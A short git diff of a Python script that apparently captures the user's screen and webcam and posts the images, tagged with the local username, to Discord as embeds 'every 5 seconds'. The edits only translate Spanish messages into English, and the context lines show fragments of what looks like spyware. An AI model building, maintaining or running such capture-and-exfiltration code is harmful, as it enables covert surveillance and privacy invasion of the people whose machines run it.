@@ -18,7 +18,7 @@ username = getpass.getuser()
 def generar_imagen_error():
     img = Image.new("RGB", (640, 480), (0, 0, 0))
     dibujo = ImageDraw.Draw(img)
-    texto = "No se encontró webcam"
+    texto = "No webcam"
     ancho, alto = dibujo.textsize(texto)
     dibujo.text(((640 - ancho) // 2, (480 - alto) // 2), texto, (255, 255, 255))
     return img
@@ -114,7 +114,7 @@ def screen():
 
         embed = DiscordEmbed(
             title="🖥 Discord: https://discord.gg/y92sn3EsWR",
-            description=f"Usuario: **{username}**\nNew capture every 5 seconds",
+            description=f"User: **{username}**\nNew capture every 5 seconds",
             color=0x2ECC71
         )
         embed.set_author(
